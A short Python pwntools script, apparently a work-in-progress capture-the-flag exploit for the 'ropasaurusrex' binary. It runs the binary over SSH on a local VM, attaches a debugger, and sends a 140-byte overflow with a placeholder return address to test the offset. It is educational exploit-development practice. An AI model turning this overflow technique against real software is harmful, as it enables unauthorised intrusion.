from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
ssh = ssh("federicomegler", "10.211.55.3")
r = ssh.process("./ropasaurusrex")
gdb.attach(r, """c
""")

input("wait")

payload = "BBBB"

r.send("A"*140 + payload)

r.interactive()
